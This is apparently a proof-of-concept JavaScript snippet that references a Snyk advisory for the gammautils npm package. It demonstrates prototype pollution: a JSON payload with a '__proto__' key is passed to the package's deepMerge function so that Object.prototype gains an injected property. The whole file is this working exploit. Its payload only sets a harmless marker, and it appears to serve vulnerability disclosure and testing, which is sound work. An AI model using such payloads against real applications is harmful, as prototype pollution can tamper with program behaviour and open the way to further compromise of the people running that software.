//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
  const gammautils = require("gammautils");
  var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  gammautils.object.deepMerge({}, payload);
